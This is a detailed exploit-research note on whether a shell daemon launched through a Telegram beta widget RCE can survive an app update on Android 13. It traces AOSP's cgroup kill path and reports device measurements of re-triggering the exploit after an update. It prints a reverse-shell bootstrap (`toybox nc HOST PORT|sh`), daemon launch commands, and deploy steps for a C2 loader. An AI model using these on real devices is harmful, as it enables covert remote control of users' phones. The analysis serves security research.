# Local ACE via the existing widget RCE: can an app-UID daemon survive an app update?

Date: 2026-11-02; device update 2026-11-03
Target: `org.telegram.messenger.beta` 13.2.0 beta, versionCode **72799**,
arm64, Sony **XQ-BT52** (Xperia 10 III), Android 13, build **62.2.A.0.533**,
UID **10357** (`u0_a357`); the test device is Magisk-rooted, but the exploit
path is no-root (root was lab setup only, see below).
Scope: **host/source plus a device run on 2026-11-03** (§0.1). The Sony test
device is actually Magisk-rooted; root was used **only** to restore the
archived account DB/`tgnet.dat`/`userconfing.xml` and, for convenience, to run
the scheduling helper as UID 10357. The exploit/re-trigger path itself is the
existing widget RCE (#1827/#1865, `system()` as the app UID) plus
`SYSTEM_ALERT_WINDOW`; no root is required by the mechanism. This note does not
add an exploit.

Companion artifacts:

* `lab/local_ace_daemon/` — daemon, trigger, bootstrap, loader, 35-check host
  test, analysis notes, device plan.
* `notes/android_update_daemon_survival.md` + `lab/update_daemon_survival/` —
  the parallel **mechanism** analysis and device kit (M0/T0/T1/T4). The two
  notes agree on the cgroup kill; this note adds the ACE daemon and the
  post-update re-trigger.
* `notes/update_widget_cache.md` — the widget message is a re-infection seed,
  not an automatic trigger.
* `REPORT_20261102.md` — the main report; not modified here.

---

## 0. Verdict

**The daemon cannot survive an app update.** Android 13's update path calls
the same `forceStopPackageLocked` → `ProcessRecord.killLocked` →
`ProcessList.killProcessGroup(uid, appPid)` core as `am force-stop`. That is a
**cgroup** kill, not a POSIX process-group kill: it reads the app's
`uid_10357/pid_<app>/cgroup.procs` and SIGKILLs every PID in it, including a
`setsid`/`nohup`/double-fork child. The update differs from force-stop only in
post-kill bookkeeping: force-stop marks the package stopped and sends
`ACTION_PACKAGE_RESTARTED`; the update does not. It does not spare the process
or its cgroup.

The **only** app-UID branch that can leave a process alive is a narrow
fork-vs-`cgroup.procs`-read race (a child forked after the last read that
returned 0, left in the orphaned cgroup) or a cgroup escape the app UID does
not have. A race is not a design and not update persistence. With no live
`ProcessRecord`, the update has nothing to kill — but reaching that state
requires the daemon to have already survived the app's own cgroup kill.

What **does** survive the update is **app data**: the widget message in
`cache4.db` and the C2/ACE scripts in `files/`. After the update, the first
exploit runs again when the widget chat is rendered; that re-deploys the
daemon. This is a **re-deployable local ACE**, not an update-surviving
process. The seed is passive: it does not execute itself. The chat open is
user-mediated, or — measured 2026-11-03 — an activity PendingIntent alarm with
`SYSTEM_ALERT_WINDOW` (update-only; the alarm dies on reboot). The overlay can
also help a **live** daemon start an activity from the background, but it does
not keep the daemon alive across the update.

So the answer to "is this a real update-surviving local ACE, or only a
force-stop-fragile process?" is: **only a force-stop-fragile (and
update-fragile) process, plus a passive app-data seed that can re-establish
the ACE when the chat is opened.** The first exploit is a real local ACE; the
daemon is a session extender, not a persistence layer.

### 0.1 Device run 2026-11-03 — the seed can be re-triggered after update, with overlay

The daemon verdict is unchanged; the measured result adds the exact
**re-trigger** condition:

* `SYSTEM_ALERT_WINDOW` was set to `allow` (`appops get` verified). The
  activity PendingIntent alarm was created as UID 10357; target
  `LaunchActivity`, deep link
  `tg://openmessage?user_id=<CHAT_ID>&message_id=79415`.
* `adb install -r` (same 72799) killed the app at 00:54:38
  (`installPackageLI`, new code path `~~G0ZPZt9...`). The alarm fired at
  00:56:02. The log shows
  `Background activity start ... allowed because SYSTEM_ALERT_WINDOW permission is granted`,
  then `load messages in chat <CHAT_ID> ... max_id 79415` and
  `present fragment un args=Bundle[{message_id=79415, user_id=<CHAT_ID>}]`.
  Message 79415 rendered the existing 13,784 B #1827/#1865 payload and the
  screen debug showed `DBG ... HOOKED | AFTER`. **The first RCE ran again
  after the update.**
* The `chat_id=...` deep link did **not** navigate for this user chat; only
  `user_id=...` did. The helper's original `activity` mode is therefore wrong
  for chat <CHAT_ID>; the new `user` mode is the measured one.
* After `adb reboot`: the activity alarm was gone (no Telegram entry in
  `dumpsys alarm`), as expected. A **non-persisted** `KeepAliveJob` job was
  present before reboot but absent after; `JobIntentService`/`KeepAliveJob`
  never call `setPersisted(true)`. A lab job with `setPersisted(true)` did
  survive (`jobs.xml` + `dumpsys jobscheduler` `PERSISTED`), but
  `KeepAliveJob` only waits on its latch; `cmd jobscheduler run -f` while the
  device was locked reported `FORCED` but started no app process. There is
  **no reboot→chat** path.
* The daemon still dies with the app cgroup on the update; the positive result
  is the **re-deployable seed** (alarm + overlay + chat render), not a
  surviving daemon. No new parser ACE is claimed.

Evidence: `lab/post_update_retrigger/device/20261103/`,
`notes/post_update_retrigger.md` §0.1, `lab/post_update_retrigger/device/known_good/`,
`lab/post_update_retrigger/device/restore_db.sh`.

---

## 1. What the first exploit gives (and does not)

The widget payload (`lab/regexp1827_class64/device_payload_v6_72799.js`, with
the v3 device fix in `notes/regexp1827_class64_v3_device_fix.md`) runs inside
the Telegram widget's QuickJS engine when the widget message is rendered. It
turns the #1827 UAF into a BigInt64 view over arbitrary memory and overwrites
`rt->mf.js_free` with `system`, so the next large free calls
`system(cmd)` as UID 10357. The command is a short bootstrap:

```sh
setsid sh -c '/system/bin/sleep 2|/system/bin/toybox nc HOST PORT|sh' &
```

The C2 loader serves the implant; the C2 supervisor (`setsid`) restarts it.
All of this is real and already measured. What it does **not** give:

* a different UID (it is 10357, `untrusted_app`);
* a different cgroup (the child inherits the app process's cgroup);
* an update/boot hook (no init service, no `wrap.<pkg>`, no `LD_PRELOAD`);
* a way to open an activity from the background without a BAL exemption.

The widget message itself is durable app data. It survives an app update and
re-syncs from the server if the local DB is cleared. It is the only proven
no-root seed that can re-run the exploit after an update. It is not a trigger:
it needs the chat to be rendered.

---

## 2. Daemon design (what was built)

The lab daemon is `lab/local_ace_daemon/daemon/ace_daemon.sh`; the trigger is
`ace_trigger.sh`; the loader payload is generated from
`ace_bootstrap.sh.in` by `host/make_bundle.py`.

### 2.1 Start and detachment

The bootstrap is delivered by the existing one-shot `system()` command and
runs as the app UID. It installs the scripts in
`/data/user/0/org.telegram.messenger.beta/files/.ace/` (mode 700) and starts:

```sh
ACE_DIR=... ACE_PKG=... ACE_CHAT_ID=... ACE_TRIGGER=... \
  setsid sh "$D/ace_daemon.sh" </dev/null >>"$D/daemon.out" 2>&1 &
```

`setsid` gives the daemon a new session and process group, so the widget
sandbox teardown and the app's process-group signals do not reach it. The
`setsid` parent exits; the daemon is reparented to init. This is the standard
`setsid`/double-fork design; it is **not** a cgroup escape.

The daemon writes `ace_daemon.pid` only after winning a `mkdir` lock; a
duplicate exits 2. It rotates `ace.log` at 1 MiB, writes a heartbeat (`hb`),
an atomic `state` (`apk=`, `sig=`, `app_pid=`, `app_cgroup=`, `hb=`,
`version=`), and a `trigger.log`. It ignores HUP, logs TERM/INT, and exits on
a `stop` file. The host test (`dash host/run_host_test.sh`) exercises the
lock, duplicate, start/stop, state, APK signature change, app-PID
disappearance, trigger, bootstrap idempotence, BAL denial and log rotation:
**PASS=35 FAIL=0** under dash (both shells are syntax-checked).

### 2.2 UID, SELinux, files

* UID 10357, SELinux `u:r:untrusted_app:s0:c101,c257,c512,c768` (the C2
  evidence has this context). The daemon runs in the same domain.
* App data is `app_data_file`; the daemon reads/writes only its own
  `files/.ace` (or the C2 `files/.c2` if `ACE_C2=1`).
* Android 10+ denies `execve` of `app_data_file`; the daemon is started as
  `sh script`, not as an executable. A compiled ELF in app data is not a
  viable payload; the daemon is a shell script plus toybox.
* The app's `INTERNET` permission applies; the C2 transport is the existing
  `nc`/FIFO protocol. No root, no other package, no `/data/system`.

### 2.3 What it can do while alive

* heartbeat, bounded logs, state, lock, restart the C2 supervisor
  (`ACE_C2=1`);
* watch `pm path` and `stat` the installed APK (path/inode/size/mtime) to
  notice a replace;
* watch `pidof` and `/proc/<pid>/cgroup` for the app process;
* run `am start`/`am startservice`/`am broadcast` and log the exact result;
* keep a C2 session alive across a widget sandbox teardown, an app process
  crash (subject to the cgroup kill/race), and the app being backgrounded
  while the UID is unfrozen.

### 2.4 What it cannot do

* survive `am force-stop` or an app update (the cgroup kill);
* escape the app cgroup (no writable `cgroup.procs`, no `CAP_SYS_ADMIN`, no
  second UID);
* run while the cached-app freezer has the UID cgroup frozen;
* start an activity from the background without `SYSTEM_ALERT_WINDOW`, a
  notification PendingIntent, or a visible app window (BAL);
* re-create itself after the update; there is no init/boot hook.

---

## 3. Update kill path vs `am force-stop` (AOSP 13)

The full chain is in `lab/local_ace_daemon/analysis/update_kill_path.md` and
`lab/update_daemon_survival/SOURCE_REFS.md`. Summary:

```
installPackageLI (InstallPackageHelper.java:1098)
  → freezePackageForInstall(..., "installPackageLI")          :1516
  → PackageManagerService.freezePackage                        :4178
  → new PackageFreezer(...)                                    PackageFreezer.java:60-66
  → PackageManagerService.killApplication                      :2930-2947
  → IActivityManager.killApplication
  → AMS KILL_APPLICATION_MSG                                   :1748-1757
  → forceStopPackageLocked(pkg, appId, false,false,true,false,false,userId,reason)
                                                               :4459-4507
  → ProcessList.killPackageProcessesLSP                        :2666-2805
  → ProcessRecord.killLocked                                   ProcessRecord.java:1083-1088
  → ProcessList.killProcessGroup(uid, appPid)                  :1492-1501
  → Process.killProcessGroup JNI                               android_util_Process.cpp:1236-1239
  → libprocessgroup killProcessGroup(uid, pid, SIGKILL)        processgroup.cpp:487
      DoKillProcessGroupOnce reads uid_<uid>/pid_<pid>/cgroup.procs,
      kills every pgid and every remaining pid                 :347-416
```

The reason string on the device is exactly the one built at
`ActivityManagerService.java:4500`:

```
11-01 19:05:04.040  1728  2025 I am_uid_stopped: 10357
11-01 19:05:04.042  1728  2025 I am_kill : [0,6157,
  org.telegram.messenger.beta,0,stop org.telegram.messenger.beta due to installPackageLI]
11-01 19:05:04.043  1728  2025 I wm_finish_activity: [... proc died without state saved]
11-01 19:05:04.057  1728  2025 I wm_task_removed: [...]
```

Source: `evidence/evidence_20261101/new_beta_72799/nb_v4_run2.log:12274-12279`
(an in-app APK update at 19:05:04 on 2026-11-01). The parallel note also
cites `nb_v2_run10.log:11990`. The `libprocessgroup` kill is exercised on this
phone (`sony_sweep/runs/b5_idle60/logcat.txt:1777`:
`Successfully killed process cgroup uid 10357 pid 31275 in 0ms`).

`am force-stop` (public API, `ActivityManagerService.java:3977-4030`) adds:

1. `pm.setPackageStoppedState(packageName, true, user)` (`:4015`);
2. `finishForceStopPackageLocked` (`:4023`) → `ACTION_PACKAGE_RESTARTED`.

The install path calls `forceStopPackageLocked` directly, so it does **not**
set the stopped state and does not send `PACKAGE_RESTARTED`. That is why the
app can be restarted normally after an update, and why alarms/jobs are
preserved (see §5). It is **not** a gentler process kill. `am kill` /
`killBackgroundProcesses` also goes through
`ProcessRecord.killLocked` → `killProcessGroup`; it is not a gentler path
either. A cached app can be frozen, but a kill still tears down its cgroup.

### 3.1 `appDiedLocked` closes the "kill the parent first" hole

`ActivityManagerService.appDiedLocked` (`:3302-3322`) calls
`ProcessList.killProcessGroup(app.uid, pid)` for an unexpected death
(`!app.isKilled()`). If the daemon kills the app, or the app crashes, or the
app exits, the cgroup is killed. If AMS kills the app, `ProcessRecord.killLocked`
already killed the cgroup. There is no stable "orphan the cgroup" trick.

### 3.2 The one race

`DoKillProcessGroupOnce` reads `cgroup.procs` once per iteration; a child
forked after the last read that returned 0 is not in the kill list.
`KillProcessGroup` retries 40 × 5 ms; if the fork lands after the final read,
`RemoveProcessGroup` fails with `EBUSY` and the child remains in the orphaned
cgroup. This is the only non-privileged survival branch. It applies to any
app death, not specifically an update; it is a microsecond-to-millisecond
race; the surviving child is in the **old** `pid_<app>` cgroup, not the new
app process's cgroup. A later update with no live `ProcessRecord` does not
reach it, but that is "the update had nothing to kill", not "the update
preserved the daemon". The parallel note §3(3)/§5 and
`analysis/cgroup_and_freezer.md` §2.1 describe it. Do not present a single
race survival as a persistence property.

### 3.3 `--dont-kill` is not an escape

`PackageInstallerSession` clears `INSTALL_DONT_KILL_APP` when a base APK is
installed (`PackageInstallerSession.java:2840-2844`, `2887-2891`, comment
"Installing base.apk. Make sure the app is restarted"). `pm install -r
--dont-kill` still kills a base-APK update; the flag only helps feature
splits. The parallel note §2 has the same citation.

---

## 4. Why `setsid`/`nohup`/double-fork do not help

`setsid` changes the session and process group; `nohup` ignores SIGHUP;
double-fork reparents to init; closing stdio and `umask` change nothing about
the cgroup. The child stays in `uid_10357/pid_<app>`, and
`DoKillProcessGroupOnce` enumerates that cgroup's `cgroup.procs`, not the
POSIX process group. A `setsid` daemon is a process-group leader
(`pgid == pid`), so it is killed by `kill(-pgid)`; a non-leader is killed by
PID. Both are in the cgroup list.

The **cached-app freezer** (Android 11+) freezes the app's UID cgroup when
Telegram is cached; the daemon freezes/thaws with the app. It is therefore not
a background watchdog: it only runs while the UID is unfrozen. A frozen task
can still be SIGKILLed, so the update kill works. A shell process cannot start
a foreground service to keep the UID unfrozen (Android 12+ FGS restriction,
and the service would be an app process in the same cgroup anyway).

Escape attempts and outcomes:

| attempt | outcome |
|---|---|
| `setsid`, `nohup`, double-fork, `disown`, `setpgid` | session/pgid only; same cgroup; killed |
| reparent to init | cgroup unchanged; killed |
| `setuid`/`setresuid` | no `CAP_SETUID`; SELinux; denied |
| user namespace + uid 0 inside | real UID/cgroup unchanged; userns usually disabled |
| write `/sys/fs/cgroup/.../cgroup.procs` | system-owned, SELinux `untrusted_app` denied |
| `clone3(CLONE_INTO_CGROUP)` | needs a writable cgroup fd/privileges; no |
| `app_process`/`am`/`cmd` to start a process | still UID 10357; new app cgroup also killed |
| second app with its own UID | cannot install without user/root |
| `run-as`/`su` | `run-as` is shell→app; no `su` |
| init service / `wrap.<pkg>` / `LD_PRELOAD` | root/system only |

The root dry run in `evidence/evidence_20261101/persistence/root_dryrun.txt`
is the control: the same watcher as root survives force-stop; the app-UID
watcher does not. The cgroup is the difference, not the script.

---

## 5. Re-trigger after the update

The full analysis is `lab/local_ace_daemon/analysis/retrigger_bal.md`. The
widget chat can be opened with Telegram's exported trampoline:

```sh
am start -W -n org.telegram.messenger.beta/org.telegram.messenger.OpenChatReceiver \
  -a com.tmessages.openchat<CHAT_ID> --el chatId <CHAT_ID>
```

`OpenChatReceiver` is an exported `Activity` (`AndroidManifest.xml`; code
`org/telegram/messenger/OpenChatReceiver.java`); it checks the action prefix,
reads `chatId`/`userId`/`encId`, and forwards to `LaunchActivity`. From
`adb shell` (UID 2000) this works. From the app UID (the daemon) it is
subject to Android 13 BAL.

### 5.1 BAL: what the app UID can use

`BackgroundActivityStartController.checkBackgroundActivityStart` allows a
start only for a small set of callers/states: root/system/NFC, home, IME, a
visible window, a persistent system process, `START_ACTIVITIES_FROM_BACKGROUND`
(signature/privileged), recents, device owner, companion, **`SYSTEM_ALERT_WINDOW`**
(`:331-341`), a notification PendingIntent token (`:261-300`), a process
bound by a foreground UID, or the 10 s grace period after an activity
start/finish (`BackgroundLaunchProcessController:76-104`).

For the daemon:

* **visible window/foreground**: only while the user has Telegram open — the
  "user opens the app" case;
* **`SYSTEM_ALERT_WINDOW`**: Telegram declares it (manifest line 52) and uses
  `Settings.canDrawOverlays` (`mf/b.java`), but the special app access is not
  granted by default. If the user has granted "Display over other apps", a
  start from a process that identifies as the Telegram package (a
  Java/`app_process` helper) should be exempt; **`am start` may still fail**
  because `am` passes `SHELL_PACKAGE_NAME` (`com.android.shell`) as the
  calling package (`ActivityManagerShellCommand.java:598,603`), so the SAW
  check may not see Telegram's app-op. Check
  `appops get org.telegram.messenger.beta SYSTEM_ALERT_WINDOW`; T7 measures
  `am`, and a Java helper is the faithful test. Do not assume `am` + SAW;
* **notification PendingIntent**: a posted notification's PendingIntents get a
  BAL token (`NotificationManagerService:6570-6580`), and a full-screen
  intent can auto-launch when the screen is off/locked. But the notification
  must be posted **after** the update; the daemon is dead; `cmd notification
  post` is shell-only (`NotificationShellCmd.checkShellCommandPermission`).
  A custom `app_process`/dex helper could post it, but it is extra machinery
  and user-visible. This is an optional, unverified probe (T8);
* **`am broadcast --allow-background-activity-starts`**: requires
  `START_ACTIVITIES_FROM_BACKGROUND` (`ActivityManagerService:13642-13658`);
  app UID denied;
* **`BIND_ALLOW_BACKGROUND_ACTIVITY_STARTS`**: same permission
  (`ActiveServices:2829-2834`); denied;
* **start-foreground-service**: Android 12+ background FGS restriction; and
  an FGS procstate is not TOP, so the activity start is still blocked;
* **alarms**: an activity PendingIntent alarm is explicitly BAL-restricted
  (`AlarmManagerService:341-342,1875-1876,4824-4833`). An alarm can wake a
  broadcast/service, not open the chat;
* **jobs**: a JobScheduler job survives the update (jobs are canceled on
  `PACKAGE_RESTARTED`/full removal, not the install path) and can start
  `KeepAliveJob` — a process warm, not a chat open;
* **`cmd alarm`**: it is the `AlarmManagerShellCommand` (system
  time/timezone/config), not an app alarm; a shell cannot create the
  `PendingIntent` an app alarm needs. It is not a trigger;
* **`app_process`**: executable as UID 10357 (the `am`/`cmd` scripts use it),
  but it does not change the UID or cgroup and every Binder call is still
  checked against UID 10357. A custom dex in app data is a **device probe**
  (app-data dex/dalvik-cache behavior is not verified here); it is useful for
  a Java-side notification/alarm experiment (T8), not survival. An ELF in app
  data is not executable (`app_data_file`).

### 5.2 Telegram components that look useful but are not

| component | what it does | why it does not trigger the widget |
|---|---|---|
| `BringAppForegroundService` | `IntentService.onHandleIntent` starts `LaunchActivity` | the `startActivity` is a fresh BAL start by the app UID; `am startservice` gives it no BAL token; blocked in the background unless SAW |
| `NotificationsService` | `onCreate` calls `w0.w()`; sticky | warms the app process; no chat |
| `AppStartReceiver` | `BOOT_COMPLETED` / `org.telegram.start` | starts the push/app process; no chat; no `MY_PACKAGE_REPLACED` receiver in 72799 |
| `KeepAliveJob` | waits up to 60 s | no chat; a job can warm the process |
| `LaunchActivity` | normal launcher; restores only `savedInstanceState` | the update removes the task with `proc died without state saved`; no last-chat preference; a cold start lands on the chat list |
| `OpenChatReceiver` | exported trampoline to `LaunchActivity` | correct target; the BAL gate is the caller |

### 5.3 The re-trigger that actually works

After an update, the widget message is still in `cache4.db`; the app data
survives. The proven re-trigger is:

1. the user (or an external `adb shell am start`, or a granted-SAW app-UID
   `am start`) opens the widget chat <CHAT_ID>;
2. `ChatMessageCell` binds the widget message, the QuickJS engine renders the
   HTML, the #1827 payload runs, and `system()` executes as UID 10357;
3. the payload re-fetches the ACE/C2 bootstrap and re-deploys the daemon.

This is a **re-deployable local ACE**: the seed is app data, the execution is
the first exploit, the daemon is re-created. It is **not** an
update-surviving process, and the seed is **passive**: it does not execute
itself. The post-update chat open is user-mediated (or an external
shell/automation); `SYSTEM_ALERT_WINDOW` does not change that because the
daemon is dead. The "daemon opens the chat after the update" step in the
original question is impossible as stated: the daemon is killed by the update
before it can open anything.

The only autonomous post-update variants that are sometimes suggested are
device-specific or unproven, and none of them is a daemon survival:
`SYSTEM_ALERT_WINDOW` helps a **live** daemon start an activity from the
background, but the daemon is not live after the update; a notification
full-screen intent must be posted after the update, which needs a live
process (`app_process`/Java) and is user-visible; a startup payload (forged
`base.art`) would have to run at app-process start, and the current PoC
crashes at a null fake-Class field
(`notes/persistence_local_existing_rce.md` §7); the update may regenerate the
image. Do not claim any of them as update persistence without a device test
and a named mechanism.

For completeness: the parallel note's "durable persistence has to come from
code that re-runs on app start" is correct as a direction, but the
72799-specific options are weak. The **bundle hook** is the QuickJS widget
bundle (`sandbox-bundle.js`), evaluated only when a widget view is bound, so
it is not a startup trigger. The **native-lib fallback**
(`files/lib/libtmessages.49loc.so`) is real but root-gated
(`notes/native_appdata_audit.md`). The **forged ART app image** is the only
no-root startup candidate, and it is not working. The only **proven** no-root
re-run is the widget message and a chat open.

---

## 6. Device test plan

The runnable plan is `lab/local_ace_daemon/device/test_plan.md` (T0-T10). The
decisive test is **T4**; the same mechanism is measured by the parallel
`lab/update_daemon_survival/` kit (M0/T0/T1/T4). Run M0/T0 first; reuse its
`capture.sh` output.

Summary:

| test | action | expected |
|---|---|---|
| T0 | preflight: `pm path`, versionCode, UID, `appops get SYSTEM_ALERT_WINDOW` | 72799, UID 10357, SAW state recorded |
| T1 | baseline widget chat open via `adb shell am start` | widget runs, proof/C2 |
| T2 | deploy the ACE daemon (C2 `exec` or widget path); read `ace.log`/`state` | daemon UID 10357, `cg == appcg` (`uid_10357/pid_<app>`) |
| **T4** | **`adb install -r` the same 72799 APK** | **`am_kill ... installPackageLI`, `am_uid_stopped`, cgroup kill; daemon gone** |
| T5 | `am force-stop` control | daemon gone; same process kill |
| T6 | after update, `adb shell am start` the widget chat | widget runs; first exploit re-runs; daemon re-deploys (the seed survives) |
| T7 | app-UID `ace_trigger.sh chat` while backgrounded, then foreground | blocked unless SAW; works foreground; record the exact log |
| T8 | optional notification/full-screen probe | not required; user-visible; unverified |
| T9 | reboot | no daemon; app data/widget seed persists; T6 re-runs |

Record before T4: the daemon PID, PPID, UID, `/proc/<pid>/cgroup`, the app
`/proc/<pid>/cgroup`, `ps`, and the last `ace.log` heartbeat. After T4:
`am_kill ... installPackageLI`, `am_uid_stopped`, any
`libprocessgroup: Successfully killed process cgroup uid 10357 pid ...`,
`ps` (no daemon), and the daemon's last log line. The T4 prediction is
**dead**. If the daemon survives, capture its cgroup and the full log; the
only accepted explanation is the fork race (a child in the old orphaned
cgroup) or a cgroup escape; do not call it update persistence without
naming the mechanism.

A single device run cannot prove a negative, but T4 plus M0/T0 can refute the
source model if the daemon survives. The source model plus the device log
`am_kill ... installPackageLI` is already strong evidence that the update
kills the app process; the remaining device question is only whether the
daemon shares the killed cgroup (T0/T2) and whether the cgroup kill reaches it
(T4).

---

## 7. Critical verdict and exact failure modes

### 7.1 Is it a real update-surviving local ACE?

**No.** It is a real local ACE (the first exploit), and the daemon is a real
app-UID process, but the daemon is **update-fragile** exactly like it is
force-stop-fragile. The update and force-stop share the cgroup kill. The
update-surviving part is app data (the widget message), which is passive and
requires a chat open. The correct claim is:

> a re-deployable local ACE via the app-data widget message; a daemon that
> extends the session while the app is alive; no update-surviving process and
> no autonomous post-update trigger (the daemon is dead; `SYSTEM_ALERT_WINDOW`
> helps only a live daemon).

### 7.2 Exact failure modes

1. **UID/cgroup kill on update.** `installPackageLI` → `PackageFreezer` →
   `killApplication` → `forceStopPackageLocked` →
   `ProcessRecord.killLocked` → `ProcessList.killProcessGroup(uid, appPid)`.
   `libprocessgroup` reads the app cgroup's `cgroup.procs` and kills every
   PID, including `setsid`/`nohup`/double-fork children. This is the primary
   and sufficient failure.
2. **No cgroup escape.** The daemon is in `uid_10357/pid_<app>`; writing
   `cgroup.procs` requires system ownership/SELinux permission the app UID
   does not have. `setuid`, user namespaces, `CLONE_INTO_CGROUP`, `run-as`,
   `su`, init services and `wrap.<pkg>` are unavailable without root/system.
3. **`appDiedLocked` kills the cgroup on a crash.** A daemon cannot orphan
   its cgroup by killing the app; the unexpected-death path calls
   `killProcessGroup` too. The only exception is the fork race (not stable).
4. **Cached-app freezer.** The daemon freezes/thaws with the app's UID
   cgroup; it is not a background watchdog and cannot monitor the update
   while Telegram is cached. It can still be SIGKILLed while frozen.
5. **BAL blocks the re-trigger.** An app-UID `am start` from the background is
   blocked unless the UID has a visible window, `SYSTEM_ALERT_WINDOW`, a
   notification PendingIntent token, or the 10 s grace. The update kills the
   app, so there is no visible window; the daemon is dead, so it cannot use a
   notification it would have to post. `am` also passes
   `com.android.shell` as the calling package
   (`ActivityManagerShellCommand.java:598,603`), so the SAW check may not see
   Telegram's app-op; a Java helper is the faithful form, not `am`. `am
   broadcast --allow-background-activity-starts` and
   `BIND_ALLOW_BACKGROUND_ACTIVITY_STARTS` require a signature permission the
   app does not have. An alarm activity PendingIntent is explicitly
   BAL-restricted. `BringAppForegroundService` starts `LaunchActivity` but is
   itself BAL-gated.
6. **No `MY_PACKAGE_REPLACED` receiver in 72799.** The update does not start
   the app or a chat. `AppStartReceiver` handles `BOOT_COMPLETED` and
   `org.telegram.start` only; `LaunchActivity` has no last-chat restore; the
   update removes the task with `proc died without state saved`. A cold start
   lands on the chat list; the widget is not rendered.
7. **Alarms/jobs only wake the app.** They survive the update (unlike
   force-stop) but can start only an app process or a Telegram `JobService`
   (`KeepAliveJob`), not the widget chat. They matter for a startup payload,
   not for the first exploit.
8. **`--dont-kill` does not protect a base APK.** The installer session clears
   `INSTALL_DONT_KILL_APP` for a base APK; only feature splits can use it.
9. **The app-data seed is passive.** The widget message survives, but it does
   not execute itself. A user (or an external `adb shell`/companion/automation)
   must open the chat. A notification full-screen intent posted after the
   update requires a live daemon and `app_process`/Java; it is user-visible
   and unverified.
10. **Update may regenerate `base.art`.** The forged ART app image is a
    startup candidate only; the current PoC crashes, and the update/ART may
    regenerate the image. It is not a proven update-surviving path.
11. **No boot persistence.** No init hook, no `wrap.<pkg>`, no `LD_PRELOAD`;
    a reboot kills everything. The app data/widget seed persists; the process
    does not.
12. **The fork race is not a property.** A child forked after the last
    `cgroup.procs` read can survive in the old orphaned cgroup; if the app has
    no live `ProcessRecord`, a later update does not reach it. This is
    microsecond-to-millisecond, applies to any app death, and the surviving
    child is in the **old** cgroup. It is not a reliable update-surviving
    design, and a single observation must not be generalized.

### 7.3 What is actually durable

* App data: `cache4.db` (the widget message and payload), `files/.ace/`
  (daemon scripts/logs/state), `files/.c2/` (C2), `shared_prefs`, databases.
* The first exploit's ability to run again when the widget chat is opened.
* The C2/daemon can be re-deployed after each re-trigger; the daemon is a
  session extender, not the persistence.

---

## 8. What would change the verdict

* **A process in a different UID/cgroup** (root, system, shell, a second app,
  an init service): it would survive the app cgroup kill. The first exploit
  does not provide one, and installing a second app needs user/root.
* **A cgroup escape** (writable `cgroup.procs`, a privileged move, a vendor
  API): would be a real escape; no app-UID path found; the device T0 `cg !=
  appcg` would reveal it.
* **A device where `cgroup2`/the cgroup kill is a no-op** (M0 fails): the
  source model does not apply; the update would kill only the app process, and
  a `setsid` child might survive. It would also have to explain the measured
  force-stop kill (a vendor UID-wide mechanism). Capture `/dev/cgroup_info/cgroup.rc`,
  mountinfo and `/proc/<pid>/cgroup` before claiming.
* **No live ProcessRecord at update time + a daemon that already survived the
  app death** (the fork race): the update does not reach it. Not stable; not a
  design.
* **A no-root startup code path that works on 72799** (the forged `base.art`
  fixed, or another app-data loader): it would re-run at app-process start
  after an update, independently of the chat. The current ART image crashes;
  the native loader is root-gated; the bundle hook is widget-bound, not
  startup.
* **`SYSTEM_ALERT_WINDOW` granted**: may make a **live** daemon's start work
  from the background, but `am` passes `com.android.shell` as the calling
  package, so a Java/`app_process` helper with the Telegram package is the
  faithful form (T7). It does not make the daemon survive the update; after
  the update the daemon is gone. It could help a daemon that was re-deployed
  by a seed, while that daemon is alive.
* **A notification full-screen intent posted after the update** via
  `app_process`/Java: could open the chat without a user tap when the screen
  is off/locked, but it requires a live process to post it (the daemon is
  dead) and is user-visible. Unverified.
* **A vendor update path that does not call `forceStopPackageLocked` /
  `killProcessGroup`**: the device T4 would show the daemon surviving; capture
  the cgroup and the install log before any claim.

### 8.1 The only genuinely update-surviving process: a different UID

The analysis above is about a **same-UID** daemon. The only process that
survives an app update without root is a process in a **different UID/cgroup**:
a second installed app, a shell/root process, or an init service. The first
exploit can prepare an APK in app data and launch the package installer
(`REQUEST_INSTALL_PACKAGES` is declared), but Android requires the user to
confirm the install; a silent install needs `INSTALL_PACKAGES`
(signature|privileged) or device-owner status, neither of which UID 10357 has.
A user-installed companion app with a foreground UI or `SYSTEM_ALERT_WINDOW`
could start `OpenChatReceiver` after the Telegram update and re-run the widget
exploit. That is a **second-app design**, not the `setsid` daemon; it is
outside the first-exploit-only claim, needs user consent, and is not tested
here. It is noted so the negative verdict is not mistaken for "no local ACE
can ever survive an update": a different UID can, but the first exploit does
not provide one.

---

## 9. Artifacts and reproduction

Lab:

```
lab/local_ace_daemon/
├── daemon/ace_daemon.sh          # the watchdog (POSIX sh + toybox)
├── daemon/ace_trigger.sh         # OpenChatReceiver/launch/service/broadcast
├── daemon/ace_bootstrap.sh.in    # generated self-contained loader payload
├── host/make_bundle.py           # embed the scripts, render the bootstrap
├── host/render_cmd.py            # exact one-shot system() command
├── host/serve_ace.py             # local-only bootstrap loader
├── host/run_host_test.sh         # 35-check host suite (PASS=35 FAIL=0)
├── analysis/update_kill_path.md
├── analysis/cgroup_and_freezer.md
├── analysis/retrigger_bal.md
└── device/test_plan.md           # T0-T10, decisive T4
```

Host test:

```sh
cd lab/local_ace_daemon
dash host/run_host_test.sh
# PASS=35 FAIL=0
```

Build/deploy:

```sh
python3 host/make_bundle.py --output host/ace_bootstrap.sh \
  --pkg org.telegram.messenger.beta --chat-id <CHAT_ID> --trigger 1
python3 host/render_cmd.py --host <LAN_IP> --port 5566
python3 host/serve_ace.py --host <LAN_IP> --port 5566 \
  --file host/ace_bootstrap.sh --log /tmp/opencode/ace_loader.log
# patch the existing widget payload with the printed command (c2/tools/patch_payload.py)
```

The parallel mechanism kit:

```
lab/update_daemon_survival/{hb.sh,hb_listener.py,capture.sh,deploy_cmd.sh,device_testplan.md}
```

The first-exploit payloads:

```
lab/regexp1827_class64/device_payload_v6_72799.js
notes/regexp1827_class64_v3_device_fix.md
```

---

## 10. References

AOSP 13 (android-13.0.0_r75; line numbers from the local copies):

* `services/core/java/com/android/server/pm/InstallPackageHelper.java:1098,1516`
* `services/core/java/com/android/server/pm/PackageManagerService.java:2930-2947,4178-4183`
* `services/core/java/com/android/server/pm/PackageFreezer.java` (ctor, 60-66)
* `services/core/java/com/android/server/am/ActivityManagerService.java:1748-1757,3302-3322,3977-4030,4060-4085,4459-4507`
* `services/core/java/com/android/server/am/ProcessList.java:1492-1501,2666-2805,2815-2866`
* `services/core/java/com/android/server/am/ProcessRecord.java:1083-1088`
* `frameworks/base/core/jni/android_util_Process.cpp:1236-1239`
* `system/core/libprocessgroup/processgroup.cpp:347-416,418-490`
